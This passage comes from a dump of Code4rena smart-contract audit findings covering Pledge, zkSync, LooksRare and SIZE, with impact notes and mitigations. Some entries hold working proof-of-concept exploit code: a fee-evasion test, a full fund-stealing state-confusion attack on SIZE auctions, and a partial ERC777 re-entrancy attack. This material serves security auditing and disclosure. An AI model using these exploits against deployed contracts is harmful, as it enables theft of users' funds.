until the CRV unlock decreases. For example, a balance of 4000 CRV locked for one year provides the same amount of veCRV as 2000 CRV locked for two years, or 1000 CRV locked for four years. ```  On creation, targetVotes = 100, balance = 20 -> votesDifference = 80 -> reward is allocated for 80 votes  ```solidity         // Get the missing votes for the given receiver to reach the target votes         // We ignore any delegated boost here because they might expire during the Pledge duration         // (we can have a future version of this contract using adjusted_balance)         vars.votesDifference = targetVotes - votingEscrow.balanceOf(receiver);          vars.totalRewardAmount = (rewardPerVote * vars.votesDifference * vars.duration) / UNIT;         vars.feeAmount = (vars.totalRewardAmount * protocalFeeRatio) / MAX_PCT ;         if(vars.totalRewardAmount > maxTotalRewardAmount) revert Errors.IncorrectMaxTotalRewardAmount();         if(vars.feeAmount > maxFeeAmount) revert Errors.IncorrectMaxFeeAmount();          // Pull all the rewards in this contract         IERC20(rewardToken).safeTransferFrom(creator, address(this), vars.totalRewardAmount);         // And transfer the fees from the Pledge creator to the Chest contract         IERC20(rewardToken).safeTransferFrom(creator, chestAddress, vars.feeAmount); ```  Then 1 week passed, receiver's balance decay to 10  On creation, targetVotes = 100, balance = 10 but votesDifference stays 80, and reward has only allocated for 80 votes.  ```solidity         // Rewards are set in the Pledge as reward/veToken/sec         // To find the total amount of veToken delegated through the whole Boost duration         // based on the Boost bias & the Boost duration, to take in account that the delegated amount decreases         // each second of the Boost duration         uint256 totalDelegatedAmount = ((bias * boostDuration) + bias) / 2;         // Then we can calculate the total amount of rewards for this Boost         uint256 rewardAmount = (totalDelegatedAmount * pledgeParams.rewardPerVote) / UNIT;          if(rewardAmount > pledgeAvailableRewardAmounts[pledgeId]) revert Errors.RewardsBalanceTooLow();         pledgeAvailableRewardAmounts[pledgeId] -= rewardAmount; ```  A booster boosts 80 votes and takes all rewards in the pool. However, only 80 (From booster) + 10 (From receiver) = 90 votes is active. Not 100 votes that receiver promise in the targetVotes.  Then, if another booster tries to boost 10 votes, it will be reverted with RewardsBalanceTooLow since the first booster has taken all reward that is allocated for only 80 votes.  ## Recommended Mitigation Steps You should provide a way for the creator to provide additional rewards after the pledge creation. Or provide some reward refreshment function that recalculates votesDifference and transfers the required additional reward."}, {"title": "`BLOCK_PERIOD` is incorrect", "html_url": "https://github.com/code-423n4/2022-10-zksync-findings/issues/259", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "selected for report", "M-02"], "target": "2022-10-zksync-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-zksync/blob/456078b53a6d09636b84522ac8f3e8049e4e3af5/ethereum/contracts/zksync/Config.sol#L47   # Vulnerability details  The `BLOCK_PERIOD` is set to 13 seconds in `Config.sol`. ```sol uint256 constant BLOCK_PERIOD = 13 seconds; ``` Since moving to Proof-of-Stake (PoS) after the Merge, block times on ethereum are fixed at 12 seconds per block (slots). https://ethereum.org/en/developers/docs/consensus-mechanisms/pos/#:~:text=Whereas%20under%20proof%2Dof%2Dwork,block%20proposer%20in%20every%20slot.  ### Impact This results in incorrect calculation of `PRIORITY_EXPIRATION` which is used to determine when a transaction in the Priority Queue should be considered expired.  ```sol uint256 constant PRIORITY_EXPIRATION_PERIOD = 3 days; /// @dev Expiration delta for priority request to be satisfied (in ETH blocks) uint256 constant PRIORITY_EXPIRATION = PRIORITY_EXPIRATION_PERIOD/BLOCK_PERIOD; ``` The time difference can be calulated ```python >>> 3*24*60*60 / 13    # 3 days / 13 sec block period 19938.46153846154 >>> 3*24*60*60 / 12    # 3 days / 12 sec block period 21600.0 >>> 21600 - 19938      # difference in blocks 1662 >>> 1662 * 12 / (60 * 60) # difference in hours 5.54 ``` By using block time of 13 seconds, a transaction in the Priority Queue incorrectly expires 5.5 hours earlier than is expected.  5.5 hours is a significant amount of time difference so I believe this issue to be Medium severity.  ### Recommendations Change the block period to be 12 seconds ```sol uint256 constant BLOCK_PERIOD = 12 seconds; ``` "}, {"title": "diamondCut is not protected in case of governor's key leakage", "html_url": "https://github.com/code-423n4/2022-10-zksync-findings/issues/46", "labels": ["bug", "2 (Med Risk)", "primary issue", "sponsor confirmed", "edited-by-warden", "selected for report", "M-01"], "target": "2022-10-zksync-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-zksync/blob/4db6c596931a291b17a4e0e2929adf810a4a0eed/ethereum/contracts/zksync/facets/DiamondCut.sol#L46 https://github.com/code-423n4/2022-10-zksync/blob/4db6c596931a291b17a4e0e2929adf810a4a0eed/ethereum/contracts/zksync/libraries/Diamond.sol#L277   # Vulnerability details  ## Impact  When the governor proposes a diamondCut, governor must wait for `upgradeNoticePeriod` to be passed, or security council members have to approve the proposal to bypass the notice period, so that the governor can execute the proposal.  ```    require(approvedBySecurityCouncil || upgradeNoticePeriodPassed, \"a6\"); // notice period should expire    require(approvedBySecurityCouncil || !diamondStorage.isFrozen, \"f3\"); ```  If the governor's key is leaked and noticed by zkSync, the attacker must wait for the notice period to execute the already proposed diamondCut with the malicious `_calldata` based on the note below from zkSync, or to propose a new malicious diamondCut. For, both cases, the attacker loses time.  >NOTE: proposeDiamondCut - commits data associated with an upgrade but does not execute it. While the upgrade is associated with facetCuts and (address _initAddress, bytes _calldata) the upgrade will be committed to the facetCuts and _initAddress. This is done on purpose, to leave some freedom to the governor to change calldata for the upgrade between proposing and executing it.  Since, there is a notice period (as zkSync noticed the key leakage, security council member will not approve the proposal, so bypassing the notice period is not possible), there is enough time for zkSync to apply security measures (pausing any deposit/withdraw, reporting in media to not execute any transaction in zkSync, and so on).  But, the attacker can be smarter, just before the proposal be executed by the governor (i.e. the notice period is passed or security council members approved it), the attacker executes the proposal earlier than governor with the malicious `_calldata`. In other words, the attacker front runs the governor.  Therefore, if zkSync notices the governor's key leakage beforehand, there is enough time to protect the project. But, if zkSync does not notice the governor's key leakage, the attacker can change the `_calldata` into a malicious one in the last moment so that it is not possible to protect the project.   ## Proof of Concept https://github.com/code-423n4/2022-10-zksync/blob/4db6c596931a291b17a4e0e2929adf810a4a0eed/ethereum/contracts/zksync/libraries/Diamond.sol#L277 https://github.com/code-423n4/2022-10-zksync/blob/4db6c596931a291b17a4e0e2929adf810a4a0eed/ethereum/contracts/zksync/facets/DiamondCut.sol#L46   ## Tools Used  ## Recommended Mitigation Steps  `_calldata` should be included in the proposed diamondCut: https://github.com/code-423n4/2022-10-zksync/blob/4db6c596931a291b17a4e0e2929adf810a4a0eed/ethereum/contracts/zksync/facets/DiamondCut.sol#L27  Or, at least one of the security council members should approve the `_calldata` during execution of the proposal."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-11-looksrare-findings/issues/263", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-53"], "target": "2022-11-looksrare-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-11-looksrare-findings/blob/main/data/adriro-Q.md)."}, {"title": "call opcode's return value not checked.", "html_url": "https://github.com/code-423n4/2022-11-looksrare-findings/issues/241", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-05"], "target": "2022-11-looksrare-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-11-looksrare/blob/main/contracts/lowLevelCallers/LowLevelETH.sol#L35 https://github.com/code-423n4/2022-11-looksrare/blob/main/contracts/lowLevelCallers/LowLevelETH.sol#L46 https://github.com/code-423n4/2022-11-looksrare/blob/main/contracts/lowLevelCallers/LowLevelETH.sol#L57   # Vulnerability details  ## Impact The `call` opcode's return value not checked, which could leads to the `originator` lose funds.  ## Proof of Concept The caller of `LooksRareAggregator.sol::execute` could be a contract who may not implement the `fallback` or `receive` function, when a call to it with value sent, it will revert, thus failed to receive the ETH.  Let's imagine the contract call the `execute` function to buy multiple NFTs with ETH as the payout currency and make the `isAtomic` parameter being false. Since the batch buy of NFTs is not atomic, the failed transactions in LooksRare or Seaport marketplace will return the passed ETH. The contract doesn't implement the `fallback/receive` function and the call opcode's return value not checked, thus the ETH value will be trapped in the `LooksRareAggregator` contract until the next user call the `execute` function and the trapped ETH is returned to him. The `originator` lose funds.  ```solidity     function _returnETHIfAny(address recipient) internal {         assembly {             if gt(selfbalance(), 0) {                 let status := call(gas(), recipient, selfbalance(), 0, 0, 0, 0) // @audit-issue status not checked.             }         }     } ```   ## Tools Used Manual review  ## Recommended Mitigation Steps  check the return value the `call` opcode. ```solidity     function _returnETHIfAny() internal {         bool status;         assembly {             if gt(selfbalance(), 0) {                 status := call(gas(), caller(), selfbalance(), 0, 0, 0, 0) // @audit-issue [MED] status not checked             }         }         if (!status) revert ETHTransferFail();     }      function _returnETHIfAny(address recipient) internal {         bool status;         assembly {             if gt(selfbalance(), 0) {                 status := call(gas(), recipient, selfbalance(), 0, 0, 0, 0) // @audit-issue status not checked.             }         }         if (!status) revert ETHTransferFail();     } function _returnETHIfAnyWithOneWeiLeft() internal {         bool status;         assembly {             if gt(selfbalance(), 1) {                 status := call(gas(), caller(), sub(selfbalance(), 1), 0, 0, 0, 0)             }         }         if (!status) revert ETHTransferFail();     } ```  "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-11-looksrare-findings/issues/221", "labels": ["bug", "grade-b", "judge review requested", "QA (Quality Assurance)", "sponsor confirmed", "Q-41"], "target": "2022-11-looksrare-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-11-looksrare-findings/blob/main/data/a12jmx-Q.md)."}, {"title": "Users can avoid paying any fees when using ERC20EnabledLooksRareAggregator for Seaport", "html_url": "https://github.com/code-423n4/2022-11-looksrare-findings/issues/143", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "downgraded by judge", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-04"], "target": "2022-11-looksrare-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-11-looksrare/blob/main/contracts/proxies/SeaportProxy.sol#L136-L164 https://github.com/code-423n4/2022-11-looksrare/blob/main/contracts/proxies/SeaportProxy.sol#L232-L252   # Vulnerability details  ## Impact The `order.price` in the parameter `tradeData` is not used as the actual token amount sent to the seaport market and also not checked if those are equal when using the `ERC20EnabledLooksRareAggregator` for `SeaportPorxy` with ERC20 tokens.  So users can set the order.price to ZERO to avoid paying any fees for ERC20 orders.  ## Proof of Concept Test file SeaportUSDCZeroPrice.t.sol, modified from test SeaportProxyERC721USDC.t.sol and annotate with `# diff`. ``` // SPDX-License-Identifier: MIT pragma solidity 0.8.17;  import {IERC20} from \"../../contracts/interfaces/IERC20.sol\"; import {IERC721} from \"../../contracts/interfaces/IERC721.sol\"; import {OwnableTwoSteps} from \"../../contracts/OwnableTwoSteps.sol\"; import {SeaportProxy} from \"../../contracts/proxies/SeaportProxy.sol\"; import {ERC20EnabledLooksRareAggregator} from \"../../contracts/ERC20EnabledLooksRareAggregator.sol\"; import {LooksRareAggregator} from \"../../contracts/LooksRareAggregator.sol\"; import {IProxy} from \"../../contracts/interfaces/IProxy.sol\"; import {ILooksRareAggregator} from \"../../contracts/interfaces/ILooksRareAggregator.sol\"; import {BasicOrder, FeeData, TokenTransfer} from \"../../contracts/libraries/OrderStructs.sol\"; import {TestHelpers} from \"./TestHelpers.sol\"; import {TestParameters} from \"./TestParameters.sol\"; import {SeaportProxyTestHelpers} from \"./SeaportProxyTestHelpers.sol\";  /**  * @notice SeaportProxy ERC721 USDC orders with fees tests  */ contract SeaportUSDCZeroPrice is TestParameters, TestHelpers, SeaportProxyTestHelpers {     LooksRareAggregator private aggregator;     ERC20EnabledLooksRareAggregator private erc20EnabledAggregator;     SeaportProxy private seaportProxy;      function setUp() public {         vm.createSelectFork(vm.rpcUrl(\"mainnet\"), 15_491_323);          aggregator = new LooksRareAggregator();         erc20EnabledAggregator = new ERC20EnabledLooksRareAggregator(address(aggregator));         seaportProxy = new SeaportProxy(SEAPORT, address(aggregator));         aggregator.addFunction(address(seaportProxy), SeaportProxy.execute.selector);          deal(USDC, _buyer, INITIAL_USDC_BALANCE);          aggregator.approve(SEAPORT, USDC, type(uint256).max);         aggregator.setFee(address(seaportProxy), 250, _protocolFeeRecipient);         aggregator.setERC20EnabledLooksRareAggregator(address(erc20EnabledAggregator));     }      function testExecuteWithPriceZero() public asPrankedUser(_buyer) {         bool isAtomic = true;         ILooksRareAggregator.TradeData[] memory tradeData = _generateTradeData();         uint256 totalPrice =          // diff         // not pay the fee for order 0 , so cut 250 bp from total price         (tradeData[0].orders[0].price * (10250 - 250)) /         // diff end             10000 +             (tradeData[0].orders[1].price * 10250) /             10000;         IERC20(USDC).approve(address(erc20EnabledAggregator), totalPrice);         // diff         // set order 0 price to ZERO         tradeData[0].orders[0].price = 0;         // diff end          TokenTransfer[] memory tokenTransfers = new TokenTransfer[](1);         tokenTransfers[0].currency = USDC;         tokenTransfers[0].amount = totalPrice;          erc20EnabledAggregator.execute(tokenTransfers, tradeData, _buyer, isAtomic);          assertEq(IERC721(BAYC).balanceOf(_buyer), 2);         assertEq(IERC721(BAYC).ownerOf(9948), _buyer);         assertEq(IERC721(BAYC).ownerOf(8350), _buyer);         assertEq(IERC20(USDC).balanceOf(_buyer), INITIAL_USDC_BALANCE - totalPrice);     }      function _generateTradeData() private view returns (ILooksRareAggregator.TradeData[] memory) {         BasicOrder memory orderOne = validBAYCId9948Order();         BasicOrder memory orderTwo = validBAYCId8350Order();         BasicOrder[] memory orders = new BasicOrder[](2);         orders[0] = orderOne;         orders[1] = orderTwo;          bytes[] memory ordersExtraData = new bytes[](2);         {             bytes memory orderOneExtraData = validBAYCId9948OrderExtraData();             bytes memory orderTwoExtraData = validBAYCId8350OrderExtraData();             ordersExtraData[0] = orderOneExtraData;             ordersExtraData[1] = orderTwoExtraData;         }          bytes memory extraData = validMultipleItemsSameCollectionExtraData();         ILooksRareAggregator.TradeData[] memory tradeData = new ILooksRareAggregator.TradeData[](1);         tradeData[0] = ILooksRareAggregator.TradeData({             proxy: address(seaportProxy),             selector: SeaportProxy.execute.selector,             value: 0,             maxFeeBp: 250,             orders: orders,             ordersExtraData: ordersExtraData,             extraData: extraData         });          return tradeData;     } }  ``` run test: ``` forge test --match-test testExecuteWithPriceZero -vvvvv ```  ## Tools Used foundry  ## Recommended Mitigation Steps Assert the order price is equal to the token amount of the seaport order when populating parameters."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-11-looksrare-findings/issues/136", "labels": ["bug", "G (Gas Optimization)", "grade-b", "sponsor confirmed", "G-06"], "target": "2022-11-looksrare-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-11-looksrare-findings/blob/main/data/datapunk-G.md)."}, {"title": "It is clearly stated that timelock is used, but this does not happen in the codes", "html_url": "https://github.com/code-423n4/2022-11-looksrare-findings/issues/127", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-03"], "target": "2022-11-looksrare-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-11-looksrare/blob/main/contracts/OwnableTwoSteps.sol#L11   # Vulnerability details  ## Impact  It is stated in the documents that \"contract ownership management\" is used with a timelock;  ```js README.md:   122: - Does it use a timelock function?: Yes but only for contract ownership management and not business critical functions. ```  However, the `function _setupDelayForRenouncingOwnership` where timelock is specified in the `OwnableTwoSteps.sol` contract where `owner` privileges are set is not used in the project, so a timelock cannot be mentioned.  ```solidity  function _setupDelayForRenouncingOwnership(uint256 _delay) internal {         delay = _delay;     } ```   This is stated in the NatSpec comments but there is no definition as stated in the comments;  ```solidity contracts/OwnableTwoSteps.sol:   40:      *         Delay (for the timelock) must be set by the contract that inherits from this.  ```   ## Tools Used Manuel Code Review   ## Recommended Mitigation Steps  ```diff  contracts/OwnableTwoSteps.sol:      // Delay for the timelock (in seconds)     uint256 public delay;    43       */   44:     constructor(uint256 _delay) {   45:         owner = msg.sender;   +           delay = _delay;   46:     }   47:    48      /**    ```  "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-11-looksrare-findings/issues/80", "labels": ["bug", "G (Gas Optimization)", "grade-b", "sponsor confirmed", "edited-by-warden", "G-03"], "target": "2022-11-looksrare-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-11-looksrare-findings/blob/main/data/aviggiano-G.md)."}, {"title": "Too much fee charged when Seaport is partially filled", "html_url": "https://github.com/code-423n4/2022-11-looksrare-findings/issues/71", "labels": ["bug", "2 (Med Risk)", "satisfactory", "selected for report", "sponsor confirmed", "M-02"], "target": "2022-11-looksrare-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-11-looksrare/blob/e3b2c053f722b0ca2dce3a3eb06f64859b8b7a6f/contracts/proxies/SeaportProxy.sol#L136-L147   # Vulnerability details  ## Impact When a user fulfills an order using SeaportProxy, fees are charged in the _handleFees function based on orders.price. ```solidity     function _handleFees(         BasicOrder[] calldata orders,         uint256 feeBp,         address feeRecipient     ) private {         address lastOrderCurrency;         uint256 fee;         uint256 ordersLength = orders.length;          for (uint256 i; i < ordersLength; ) {             address currency = orders[i].currency;             uint256 orderFee = (orders[i].price * feeBp) / 10000; ``` According to the Seaport documentation, Seaport allows partial fulfillment of orders, which results in too much fee being charged when an order is partially filled https://docs.opensea.io/v2.0/reference/seaport-overview#partial-fills  Consider feeBp == 2% The order on Seaport has a fill status of 0/100 and each item is worth 1 eth. User A fulfills the order using LooksRareAggregator.execute and sends 102 ETH, where order.price == 100 ETH. Since the other user fulfilled the order before User A, when User A fulfills the order, the order status is 99/100 Eventually User A buys an item for 1 ETH but pays a fee of 2 ETH. ## Proof of Concept https://github.com/code-423n4/2022-11-looksrare/blob/e3b2c053f722b0ca2dce3a3eb06f64859b8b7a6f/contracts/proxies/SeaportProxy.sol#L136-L147  ## Tools Used None ## Recommended Mitigation Steps Consider charging fees based on the user's actual filled price"}, {"title": "Attacker can steal any funds in the contract by state confusion (no preconditions)", "html_url": "https://github.com/code-423n4/2022-11-size-findings/issues/252", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-02"], "target": "2022-11-size-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L33 https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L238   # Vulnerability details  HIGH: Attacker can steal any funds in the contract by state confusion (no preconditions) LOC: https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L33 https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L238  ## Description  Auctions in SIZE can be in one of several states, as checked in the atState() modifier:  ``` modifier atState(Auction storage a, States _state) {     if (block.timestamp < a.timings.startTimestamp) {         if (_state != States.Created) revert InvalidState();     } else if (block.timestamp < a.timings.endTimestamp) {         if (_state != States.AcceptingBids) revert InvalidState();     } else if (a.data.lowestQuote != type(uint128).max) {         if (_state != States.Finalized) revert InvalidState();     } else if (block.timestamp <= a.timings.endTimestamp + 24 hours) {         if (_state != States.RevealPeriod) revert InvalidState();     } else if (block.timestamp > a.timings.endTimestamp + 24 hours) {         if (_state != States.Voided) revert InvalidState();     } else {         revert();     }     _; } ```  It's important to note that if current block timestamp is greater than endTimestamp, `a.data.lowestQuote` is used to determine if finalize() was called.  The value is set to max at createAuction. In finalize, it is set again, using user-controlled input:  ``` // Last filled bid is the clearing price a.data.lowestBase = clearingBase; a.data.lowestQuote = clearingQuote; ```  The issue is that it is possible to break the state machine by calling finalize() and setting lowestQuote to `type(uint128).max`. If the other parameters are crafted correctly, finalize() will succeed and perform transfers of unsold base amount and traded quote amount:  ``` // Transfer the left over baseToken if (data.totalBaseAmount != data.filledBase) {     uint128 unsoldBase = data.totalBaseAmount - data.filledBase;     a.params.totalBaseAmount = data.filledBase;     SafeTransferLib.safeTransfer(ERC20(a.params.baseToken), a.data.seller, unsoldBase); } // Calculate quote amount based on clearing price uint256 filledQuote = FixedPointMathLib.mulDivDown(clearingQuote, data.filledBase, clearingBase); SafeTransferLib.safeTransfer(ERC20(a.params.quoteToken), a.data.seller, filledQuote); ```  Critically, attacker will later be able to call cancelAuction() and cancelBid(), as they are allowed as long as the auction has not finalized:  ``` function cancelAuction(uint256 auctionId) external {     Auction storage a = idToAuction[auctionId];     if (msg.sender != a.data.seller) {         revert UnauthorizedCaller();     }     // Only allow cancellations before finalization     // Equivalent to atState(idToAuction[auctionId], ~STATE_FINALIZED)     if (a.data.lowestQuote != type(uint128).max) {         revert InvalidState();     }     // Allowing bidders to cancel bids (withdraw quote)     // Auction considered forever States.AcceptingBids but nobody can finalize     a.data.seller = address(0);     a.timings.endTimestamp = type(uint32).max;     emit AuctionCancelled(auctionId);     SafeTransferLib.safeTransfer(ERC20(a.params.baseToken), msg.sender, a.params.totalBaseAmount); }  function cancelBid(uint256 auctionId, uint256 bidIndex)     external {     Auction storage a = idToAuction[auctionId];     EncryptedBid storage b = a.bids[bidIndex];     if (msg.sender != b.sender) {         revert UnauthorizedCaller();     }     // Only allow bid cancellations while not finalized or in the reveal period     if (block.timestamp >= a.timings.endTimestamp) {         if (a.data.lowestQuote != type(uint128).max || block.timestamp <= a.timings.endTimestamp + 24 hours) {             revert InvalidState();         }     }     // Prevent any futher access to this EncryptedBid     b.sender = address(0);     // Prevent seller from finalizing a cancelled bid     b.commitment = 0;     emit BidCancelled(auctionId, bidIndex);     SafeTransferLib.safeTransfer(ERC20(a.params.quoteToken), msg.sender, b.quoteAmount); } ```  The attack will look as follows:  1.  attacker uses two contracts - buyer and seller 2.  seller creates an auction, with no vesting period and ends in 1 second. Passes X base tokens. 3.  buyer bids on the auction, using baseAmount=quoteAmount (ratio is 1:1). Passes Y quote tokens, where Y < X. 4.  after 1 second, seller calls reveal() and finalizes, with **lowestQuote = lowestBase = 2\\*\\*128-1**. 5.  seller contract receives X-Y unsold base tokens and Y quote tokens 6.  seller calls cancelAuction(). They are sent back remaining totalBaseAmount, which is X - (X-Y) = Y base tokens. They now have the same amount of base tokens they started with. cancelAuction sets endTimestamp = `type(uint32).max` 7.  buyer calls cancelBid. Because endTimestamp is set to max, the call succeeds. Buyer gets back Y quote tokens. 8.  The accounting shows attacker profited Y quote tokens, which are both in buyer and seller's contract.  Note that the values of `minimumBidQuote`, `reserveQuotePerbase` must be carefully chosen to satisfy all the inequality requirements in createAuction(), bid() and finalize(). This is why merely spotting that lowestQuote may be set to max in finalize is not enough and in my opinion, POC-ing the entire flow is necessary for a valid finding.  This was the main constraint to bypass:  ``` uint256 quotePerBase = FixedPointMathLib.mulDivDown(b.quoteAmount, type(uint128).max, baseAmount); ... data.previousQuotePerBase = quotePerBase; ... if (data.previousQuotePerBase != FixedPointMathLib.mulDivDown(clearingQuote, type(uint128).max, clearingBase)) {             revert InvalidCalldata();         } ```  Since clearingQuote must equal UINT128_MAX, we must satisfy: (2\\*\\*128-1) \\* (2\\*\\*128-1) / clearingBase = quoteAmount \\* (2\\*\\*128-1) / baseAmount. The solution I found was setting clearingBase to (2\\*\\*128-1) and quoteAmount = baseAmount.  We also have constraints on reserveQuotePerBase. In createAuction:  ``` if (     FixedPointMathLib.mulDivDown(         auctionParams.minimumBidQuote, type(uint128).max, auctionParams.totalBaseAmount     ) > auctionParams.reserveQuotePerBase ) {     revert InvalidReserve(); } ```  While in finalize():  ``` // Only fill if above reserve price if (quotePerBase < data.reserveQuotePerBase) continue; ```  And an important constraint on quoteAmount and minimumBidQuote:  ``` if (quoteAmount == 0 || quoteAmount == type(uint128).max || quoteAmount < a.params.minimumBidQuote) {     revert InvalidBidAmount(); } ```  Merging them gives us two equations to substitute variables in:  1.  `minimumBidQuote / totalBaseAmount < reserveQuotePerBase <= UINT128_MAX / clearingBase` 2.  `quoteAmount > minimumBidQuote`  In the POC I've crafted parameters to steal 2**30 quote tokens, around 1000 in USDC denomination. With the above equations, increasing or decreasing the stolen amount is simple.  ## Impact  An attacker can steal all tokens held in the SIZE auction contract.  ## Proof of Concept  Copy the following code in SizeSealed.t.sol  ``` function testAttack() public {     quoteToken = new MockERC20(\"USD Coin\", \"USDC\", 6);     baseToken = new MockERC20(\"DAI stablecoin \", \"DAI\", 18);     // Bootstrap auction contract with some funds     baseToken.mint(address(auction), 1e20);     quoteToken.mint(address(auction), 1e12);     // Create attacker     MockSeller attacker_seller  = new MockSeller(address(auction), quoteToken, baseToken);     MockBuyer attacker_buyer = new MockBuyer(address(auction), quoteToken, baseToken);     // Print attacker balances     uint256 balance_quote;     uint256 balance_base;     (balance_quote, balance_base) = attacker_seller.balances();     console.log(\"Starting seller balance: \", balance_quote, balance_base);     (balance_quote, balance_base) = attacker_buyer.balances();     console.log('Starting buyer balance: ', balance_quote, balance_base);     // Create auction     uint256 auction_id = attacker_seller.createAuction(         2**32,  // totalBaseAmount         2**120, // reserveQuotePerBase         2**20, // minimumBidQuote         uint32(block.timestamp), // startTimestamp         uint32(block.timestamp + 1),  // endTimestamp         uint32(block.timestamp + 1), // vestingStartTimestamp         uint32(block.timestamp + 1), // vestingEndTimestamp         0 // cliffPercent     );     // Bid on auction     attacker_buyer.setAuctionId(auction_id);     attacker_buyer.bidOnAuction(         2**30, // baseAmount         2**30  // quoteAmount     );     // Finalize with clearingQuote = clearingBase = 2**128-1     // Will transfer unsold base amount + matched quote amount     uint256[] memory bidIndices = new uint[](1);     bidIndices[0] = 0;     vm.warp(block.timestamp + 10);     attacker_seller.finalize(bidIndices, 2**128-1, 2**128-1);     // Cancel auction     // Will transfer back sold base amount     attacker_seller.cancelAuction();     // Cancel bid     // Will transfer back to buyer quoteAmount     attacker_buyer.cancel();     // Net profit of quoteAmount tokens of quoteToken     (balance_quote, balance_base) = attacker_seller.balances();     console.log(\"End seller balance: \", balance_quote, balance_base);     (balance_quote, balance_base) = attacker_buyer.balances();     console.log('End buyer balance: ', balance_quote, balance_base); } ```  ## Tools Used  Manual audit, foundry tests  ## Recommended Mitigation Steps  Do not trust the value of `lowestQuote` when determining the finalize state, use a dedicated state variable for it."}, {"title": "Auction created by ERC777 Tokens with tax can be stolen by re-entrancy attack", "html_url": "https://github.com/code-423n4/2022-11-size-findings/issues/192", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "satisfactory", "selected for report", "sponsor confirmed", "M-04"], "target": "2022-11-size-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-11-size/blob/main/src/SizeSealed.sol#L96-L102   # Vulnerability details  ## Impact The createAuction function lacks the check of re-entrancy. An attacker can use an ERC777 token with tax as the base token to create auctions. By registering ERC777TokensSender interface implementer in the ERC1820Registry contract, the attacker can re-enter the createAuction function and create more than one auction with less token. And the sum of the totalBaseAmount of these auctions will be greater than the token amount received by the SizeSealed contract. Finally, the attacker can take more money from the contract global pool which means stealing tokens from the other auctions and treasury.  ## Proof of Concept Forge test  ``` // SPDX-License-Identifier: GPL-3.0 pragma solidity 0.8.17;  import {Test} from \"forge-std/Test.sol\";  import {SizeSealedTest} from \"./SizeSealed.t.sol\"; import {ERC777} from \"openzeppelin-contracts/contracts/token/ERC777/ERC777.sol\"; import \"openzeppelin-contracts/contracts/utils/introspection/IERC1820Registry.sol\"; import {MockSeller} from \"./mocks/MockSeller.sol\"; import {MockERC20} from \"./mocks/MockERC20.sol\";  contract TaxERC777 is ERC777{     uint32 tax = 50; // 50% tax rate      constructor(string memory name_,         string memory symbol_,         address[] memory defaultOperators_) ERC777(name_, symbol_, defaultOperators_){}          function mint(address rec, uint256 amount) external{         super._mint(rec, amount, \"\", \"\", false);     }      function _beforeTokenTransfer(         address operator,         address from,         address to,         uint256 amount     ) internal override {         if(to == address(0)||from==address(0)){ return;}         // tax just burn for test              }      function _send(         address from,         address to,         uint256 amount,         bytes memory userData,         bytes memory operatorData,         bool requireReceptionAck     ) internal override {         uint tax_amount = amount* tax / 100;         _burn(from, tax_amount, \"\", \"\");         super._send(from, to, amount-tax_amount, userData, operatorData, requireReceptionAck);     }  }  contract Callback {     MockSeller seller;     uint128 baseToSell;      uint256 reserveQuotePerBase = 0.5e6 * uint256(type(uint128).max) / 1e18;     uint128 minimumBidQuote = 1e6;     // Auction parameters (cliff unlock)     uint32 startTime;     uint32 endTime;     uint32 unlockTime;     uint32 unlockEnd;     uint128 cliffPercent;      uint8 entry = 0;     uint128 amount_cut_tax;     constructor(MockSeller _seller, uint128 _baseToSell, uint256 _reserveQuotePerBase, uint128 _minimumBidQuote, uint32 _startTime, uint32 _endTime, uint32 _unlockTime, uint32 _unlockEnd, uint128 _cliffPercent){         seller = _seller;         baseToSell = _baseToSell;         reserveQuotePerBase = _reserveQuotePerBase;         minimumBidQuote = _minimumBidQuote;         startTime = _startTime;         endTime = _endTime;         unlockTime = _unlockTime;         unlockEnd = _unlockEnd;         cliffPercent = _cliffPercent;     }     function tokensToSend(address operator, address from, address to, uint256 amount, bytes calldata userData, bytes calldata operatorData) external{         if(from==address(0) || to==address(0)){return;}         if(entry == 0){             entry += 1;             amount_cut_tax = baseToSell / 2;             seller.createAuction(                 amount_cut_tax, reserveQuotePerBase, minimumBidQuote, startTime, endTime, unlockTime, unlockEnd, cliffPercent             );             return;         }         else if(entry == 1){             entry += 1;             ERC777(msg.sender).transferFrom(from, to, amount_cut_tax);             return;         }         entry += 1;         return;              }     function canImplementInterfaceForAddress(bytes32 interfaceHash, address addr) external view returns(bytes32){return keccak256(abi.encodePacked(\"ERC1820_ACCEPT_MAGIC\"));} }  contract MyTest is SizeSealedTest {          IERC1820Registry internal constant _ERC1820_REGISTRY = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);     function testCreateAuctionFromErc777() public {         TaxERC777 tax777Token;         address[] memory addrme = new 